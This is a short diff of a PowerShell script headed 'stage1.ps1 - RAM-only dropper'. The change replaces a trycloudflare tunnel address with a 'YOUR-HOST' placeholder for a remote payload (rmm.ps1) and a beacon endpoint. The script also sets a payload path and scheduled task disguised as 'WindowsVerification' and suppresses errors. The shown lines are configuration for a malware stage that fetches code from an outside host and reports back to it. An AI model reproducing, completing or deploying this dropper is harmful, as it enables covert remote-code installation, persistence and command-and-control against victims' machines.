@@ -1,8 +1,8 @@
 # stage1.ps1 - RAM-only dropper
-$PayloadUrl  = 'https://diamond-locally-rod-detective.trycloudflare.com/ttx/rmm.ps1'
+$PayloadUrl  = 'http://YOUR-HOST:8000/ttx/rmm.ps1'
 $PayloadPath = "$env:PUBLIC\WindowsVerification.ps1"
 $TaskName    = 'WindowsVerification'
-$BeaconUrl   = 'https://diamond-locally-rod-detective.trycloudflare.com/beacon'
+$BeaconUrl   = 'http://YOUR-HOST:8000/beacon'
 
 $ErrorActionPreference = 'SilentlyContinue'
 function Beacon([string]$Stage) {
